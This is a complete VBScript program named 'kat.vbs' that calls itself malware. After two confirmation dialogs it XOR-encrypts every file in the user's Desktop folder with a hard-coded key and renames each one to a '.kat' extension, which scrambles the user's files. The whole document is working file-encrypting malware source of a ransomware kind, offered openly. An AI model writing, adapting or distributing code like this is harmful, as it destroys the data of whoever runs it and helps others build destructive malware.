warning1 = msgbox("This malware can do a lot of damage, including no resetting, are you sure to continue?",vbYesNo+vbExclamation,"kat.vbs")

if warning1 = vbYes then
  warning2 = msgbox("Are you sure, this malware will make you lose your files (Well this warning is for no misclicking).",vbYesNo+vbExclamation,"kat.vbs")
  if warning2 = vbYes then

    set shell = createobject("wscript.shell")

    set fso = createobject("scripting.filesystemobject")
    function xorencrypt(text, key)
    result = ""
    for i = 1 to len(text)
        charCodeText = Asc(Mid(text, i, 1))
        charCodeKey = Asc(Mid(key, (i Mod Len(key)) + 1, 1))
        encryptedChar = Chr(charCodeText Xor charCodeKey)
        result = result & encryptedChar
    next
    xorencrypt = result
    End Function
    
    function encryptFile(flder)
      if fso.folderexists(flder) then
        set folder = fso.getfolder(flder)

        for each item in folder.files
          if not item.name = fso.getbasename(item.name) & ".kat" then
            item.name = fso.getbasename(item.name) & ".kat"
          end if
          set oldfile = fso.opentextfile(item, 1)
          oldfilecontent = oldfile.readall
          oldfile.close
          keytoencrypt = "mann"
          set newfile = fso.opentextfile(item, 2)
          newfile.write(xorencrypt(oldfilecontent, keytoencrypt))
          newfile.close
        next
      end if
    end function

    encryptFile shell.specialfolders("desktop")
  elseif warning2 = vbNo then
    wscript.quit
  end if
elseif warning1 = vbNo then
  wscript.quit
end if
